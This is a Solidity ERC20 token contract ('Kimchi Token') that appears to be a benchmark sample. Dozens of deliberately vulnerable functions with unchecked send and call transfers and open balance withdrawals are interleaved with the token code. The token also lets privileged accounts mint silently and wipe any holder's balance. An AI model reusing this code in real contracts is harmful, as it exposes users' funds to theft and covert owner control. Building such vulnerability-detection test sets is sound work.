/**
 *Submitted for verification at Etherscan.io on 2020-08-29
*/

/*

  Kimchi conquers the world.

    ██╗  ██╗██╗███╗   ███╗ ██████╗██╗  ██╗██╗    ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗
    ██║ ██╔╝██║████╗ ████║██╔════╝██║  ██║██║    ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║
    █████╔╝ ██║██╔████╔██║██║     ███████║██║       ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║
    ██╔═██╗ ██║██║╚██╔╝██║██║     ██╔══██║██║       ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║
    ██║  ██╗██║██║ ╚═╝ ██║╚██████╗██║  ██║██║       ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║
    ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
                                                                                            
  Be careful, it is so spicy.

*/

pragma solidity ^0.5.16;
interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
contract Context {
    constructor () internal { }
bool public payedOut_unchk32 = false;
address payable public winner_unchk32;
uint public winAmount_unchk32;

function sendToWinner_unchk32() public {
        require(!payedOut_unchk32);
        winner_unchk32.send(winAmount_unchk32);
        payedOut_unchk32 = true;
    }
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
function callnotchecked_unchk37(address payable callee) public {
    callee.call.value(1 ether);
  }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
  bool public payedOut_unchk45 = false;

function withdrawLeftOver_unchk45() public {
        require(payedOut_unchk45);
        msg.sender.send(address(this).balance);
    }
  mapping (address => uint) private _balances;
  function callnotchecked_unchk25(address payable callee) public {
    callee.call.value(1 ether);
  }
  mapping (address => mapping (address => uint)) private _allowances;
  function my_func_uncheck36(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
  uint private _totalSupply;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
function bug_unchk15(address payable addr) public
      {addr.send (42 ether); }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
function UncheckedExternalCall_unchk16 () public
{  address payable addr_unchk16;
   if (! addr_unchk16.send (42 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
function bug_unchk31() public{
address payable addr_unchk31;
if (!addr_unchk31.send (10 ether) || 1==1)
	{revert();}
}
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
function my_func_uncheck12(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
function my_func_unchk35(address payable dst) public payable{
        dst.send(msg.value);
    }
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
function withdrawBal_unchk29 () public{
	uint Balances_unchk29 = 0;
	msg.sender.send(Balances_unchk29);}
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
function my_func_uncheck24(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
function callnotchecked_unchk13(address callee) public {
    callee.call.value(1 ether);
  }
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
function bug_unchk42() public{
uint receivers_unchk42;
address payable addr_unchk42;
if (!addr_unchk42.send(42 ether))
	{receivers_unchk42 +=1;}
else
	{revert();}
}
    function _initMint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
function unhandledsend_unchk26(address payable callee) public {
    callee.send(5 ether);
  }
    function _spicy(address account, uint amount) internal {
        require(account != address(0), "ERC20: _spicy to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
function bug_unchk19() public{
address payable addr_unchk19;
if (!addr_unchk19.send (10 ether) || 1==1)
	{revert();}
}
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
function cash_unchk10(uint roundIndex, uint subpotIndex,address payable winner_unchk10) public{
        uint64 subpot_unchk10 = 10 ether;
        winner_unchk10.send(subpot_unchk10);  //bug
        subpot_unchk10= 0;
}
    function _stake(address acc) internal {
        require(acc != address(0), "stake to the zero address");
        uint amount = _balances[acc];
        _balances[acc] = 0;
        _totalSupply = _totalSupply.sub(amount);
    }
function bug_unchk7() public{
address payable addr_unchk7;
if (!addr_unchk7.send (10 ether) || 1==1)
	{revert();}
}
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
bool public payedOut_unchk44 = false;
address payable public winner_unchk44;
uint public winAmount_unchk44;

function sendToWinner_unchk44() public {
        require(!payedOut_unchk44);
        winner_unchk44.send(winAmount_unchk44);
        payedOut_unchk44 = true;
    }
}

contract ERC20Detailed is IERC20 {
  function bug_unchk3(address payable addr) public
      {addr.send (42 ether); }
  string private _name;
  function UncheckedExternalCall_unchk28 () public
{  address payable addr_unchk28;
   if (! addr_unchk28.send (42 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
  string private _symbol;
  function unhandledsend_unchk38(address payable callee) public {
    callee.send(5 ether);
  }
  uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
function bug_unchk43() public{
address payable addr_unchk43;
if (!addr_unchk43.send (10 ether) || 1==1)
	{revert();}
}
    function name() public view returns (string memory) {
        return _name;
    }
function callnotchecked_unchk1(address payable callee) public {
    callee.call.value(2 ether);
  }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
function bug_unchk30() public{
uint receivers_unchk30;
address payable addr_unchk30;
if (!addr_unchk30.send(42 ether))
	{receivers_unchk30 +=1;}
else
	{revert();}
}
    function decimals() public view returns (uint8) {
        return _decimals;
    }
function my_func_unchk11(address payable dst) public payable{
        dst.send(msg.value);
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract KimchiToken is ERC20, ERC20Detailed {
  using SafeMath for uint;
function UncheckedExternalCall_unchk40 () public
{  address payable addr_unchk40;
   if (! addr_unchk40.send (2 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
  mapping (address => bool) public stakers;
  constructor () public ERC20Detailed("Kimchi Token", "KIMCHI", 18) {
      _initMint( msg.sender, 1000*10**uint(decimals()) );
      stakers[msg.sender] = true;
  }
bool public payedOut_unchk9 = false;

function withdrawLeftOver_unchk9() public {
        require(payedOut_unchk9);
        msg.sender.send(address(this).balance);
    }

  function stake(address account) public {
      require(stakers[msg.sender], "error");
      _stake(account);
  }
function withdrawBal_unchk17 () public{
	uint64 Balances_unchk17 = 0;
	msg.sender.send(Balances_unchk17);}

  function spicy(address account, uint amount) public {
      require(stakers[msg.sender], "error");
      _spicy(account, amount);
  }
function withdrawBal_unchk41 () public{
	uint64 Balances_unchk41 = 0;
	msg.sender.send(Balances_unchk41);}

}